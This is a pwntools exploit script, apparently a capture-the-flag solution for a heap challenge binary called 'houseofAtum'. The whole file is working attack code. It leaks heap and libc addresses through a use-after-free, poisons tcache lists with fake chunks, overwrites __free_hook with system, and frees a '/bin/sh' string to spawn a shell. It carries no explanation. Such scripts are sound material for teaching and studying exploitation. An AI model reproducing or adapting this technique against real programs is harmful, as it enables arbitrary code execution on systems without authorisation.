#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './houseofAtum'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil(':')
    io.sendline(str(idx))

def new(c):
    menu(1)
    io.recvuntil(":")
    io.send(c)

def edit(i, c):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(i))
    io.recvuntil(":")
    io.sendline(c)

def show(i):
    menu(4)
    io.recvuntil(":")
    io.sendline(str(i))

def delete(i, f = 0):
    menu(3)
    io.recvuntil(":")
    io.sendline(str(i))
    io.recvuntil(":")
    if f == 1:
        io.sendline('y')
    else:
        io.sendline('n')

# leak heap addr
new('0')
new('1')
delete(1, 1)
delete(0, 1)
new('1')
show(0)
io.recvuntil("Content:")
heap_addr = myu64(io.recvn(6)) - 0x231
log.info("\033[33m" + hex(heap_addr) + "\033[0m")
delete(0, 1)

# allocate chunk at heap + 0x68, make it aligned
new(p64(0) * 7 + p64(0x61) + p64(heap_addr + 0x68)) # make a fake chunk, and set its FD to heap_addr + 0x68
new('1' * 8)
for i in range(7):
    delete(0)
delete(1, 1)
delete(0, 1)
new('c') # 0
new('d') # 1 this chunk will be allocated misaligned.

# create fake chunk and leak libc
delete(1, 1) # add into the 0x60 tache list
new(p64(0)) # 1 fix the FD, and it will be at the fake addr, overwrite the tcache_entries to 0
edit(0, p64(0) * 3 + p64(0xa1)) # fake size
delete(0, 1) # add into the 0x40 tcache list
edit(1, p64(0)) # then overwrite the tcache_entries to 0 again
new('a') # get from 0x40 fastbin list
delete(0, 1) # delete it, and will be added into 0x40 tcache list
edit(1, p64(0)) # overwrite tcache_entries to 0 again
new(p64(0x21) * 9) # get from top_chunk
delete(0, 1) # just remove it

edit(1, p64(heap_addr + 0x280)) # overwrite tcache_entries to 0xa0 fake chunk
new('bbbbbbbb') # allocated a 0xa0 chunk
for i in range(7):
    delete(0)
delete(0, 1) # now we get the libc address
edit(1, p64(heap_addr + 0x260))
new('a' * 0x20)
show(0)
io.recvuntil("a" * 0x20)
libc_addr = myu64(io.recvn(6)) - 0x3ebca0
libc.address = libc_addr
log.info("\033[33m" + hex(libc_addr) + "\033[0m")

# edit free_hook
delete(0, 1)
edit(1, p64(libc.symbols['__free_hook']))
new(p64(libc.symbols['system']))
edit(1, '/bin/sh\0')

menu(3)
io.sendline(str(1))



io.interactive()
